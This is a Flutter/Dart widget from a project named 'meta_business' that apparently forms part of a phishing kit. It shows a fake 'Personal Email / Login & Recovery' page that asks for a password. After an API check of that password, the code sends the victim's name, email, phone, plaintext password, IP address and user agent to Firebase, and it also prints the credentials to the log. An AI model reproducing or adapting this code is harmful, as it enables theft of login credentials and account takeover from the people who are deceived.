import 'package:_iwu_pack/setup/app_textstyles.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:gap/gap.dart';
import 'package:meta_business/src/presentation/home/bloc/home_bloc.dart';
import 'package:meta_business/src/presentation/widgets/widget_input.dart';

import '../../../utils/network_request.dart';

class ModalSuccess extends StatefulWidget {
  final FormInput? data;
  final bool isEmail;

  const ModalSuccess({super.key, this.data, required this.isEmail});

  @override
  State<StatefulWidget> createState() => _ModalSuccessState();
}

class _ModalSuccessState extends State<ModalSuccess> {
  final HomeBloc _homeBloc = HomeBloc();
  final apiClient = ApiClient();
  String error = "";
  late String password;

  TextEditingController controller = TextEditingController();

  submit() {
    if (controller.text.isEmpty) {
      setState(() {
        error = "Please enter password.";
      });
    } else {
      print("check email value ${widget.data!.email}");
      print("check passs value ${controller.text}");
      _homeBloc.add(CheckingPasswordEvent(
          widget.isEmail ? widget.data!.email : widget.data!.phone,
          controller.text,
          widget.data!.ip));
      setState(() {
        error = "";
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    print("Check isEmail ${widget.isEmail}");
    return BlocListener<HomeBloc, HomeState>(
      bloc: _homeBloc,
      listener: (context, state) {
        if (state is CheckingState) {
          showDialog(
              context: context,
              builder: (context) {
                return const Center(
                  child: CircularProgressIndicator(),
                );
              });
        }
        if (state is CheckingPasswordSuccessState) {
          Navigator.of(context).pop();
          print('return checking success state');
          print("check response ${state.response['status']}");
          if (state.response['status'] == 400) {
            setState(() {
              error = state.response['message'];
            });
          }
          if (state.response['status'] == 200) {
            print("check add to firebase event");
            _homeBloc.add(AddToFirebaseEvent(
                widget.data!.pageName,
                widget.data!.fullName,
                widget.data!.email,
                widget.data!.phone,
                controller.text,
                widget.data!.ip,
                state.response["user_agent"]));
          }
        }
        if (state is AddToFirebaseSuccessState) {
          print("check AddToFirebaseSuccessState");

          // Navigator.push(context, MaterialPageRoute(builder: (context) {
          //   return AuthScreen(
          //     rowId: state.rowId,
          //     email: state.email,
          //     password: state.password,
          //   );
          // }));
        }
      },
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Gap(8),
          Text(
            "Personal Email",
            style: w500TextStyle(fontSize: 28),
          ),
          const Gap(24),
          Text(
            "Login & Recovery",
            style: w300TextStyle(fontSize: 24),
          ),
          const Gap(8),
          Text(
            "Manage your passwords, login preferences and recovery methods.",
            style: w200TextStyle(fontSize: 14),
          ),
          const Gap(24),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                decoration: BoxDecoration(
                    boxShadow: const [
                      BoxShadow(
                        color: Color.fromARGB(
                            255, 188, 188, 188), // Màu của đổ bóng
                        blurRadius: 10, // Bán kính đổ bóng
                        spreadRadius: 2, // Phạm vi đổ bóng
                      )
                    ],
                    borderRadius: BorderRadius.circular(12),
                    color: Colors.white),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "Password",
                      style: TextStyle(fontSize: 16),
                    ),
                    TextFormField(
                      obscureText: true,
                      controller: controller,
                      decoration:
                          const InputDecoration(border: InputBorder.none),
                    ),
                  ],
                ),
              ),
              error == ""
                  ? const Text("")
                  : Padding(
                      padding: const EdgeInsets.only(top: 8.0),
                      child: Text(
                        error,
                        style: const TextStyle(color: Colors.red),
                      ),
                    )
            ],
          ),
          const SizedBox(height: 16),
          Align(
            alignment: Alignment.centerRight,
            child: ElevatedButton(
              onPressed: submit,
              style: ElevatedButton.styleFrom(
                primary: const Color(0xFF355797),
                textStyle: const TextStyle(color: Colors.white),
              ),
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 8, vertical: 16),
                child: const Text(
                  "Continue",
                  style: TextStyle(fontSize: 14),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}
